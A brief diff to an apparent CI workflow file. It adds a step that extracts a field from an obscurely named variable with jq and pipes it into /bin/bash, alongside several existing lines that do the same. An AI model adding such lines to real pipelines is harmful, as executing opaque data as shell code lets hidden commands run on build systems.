@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$l7" | jq -r .lv283 | /bin/bash
           printf '%s' "$nniau6" | jq -r .jbt796 | /bin/bash
           echo $hny557 | jq -r .oes2 | /bin/bash
+          printf '%s' "$r4" | jq -r .an78840 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
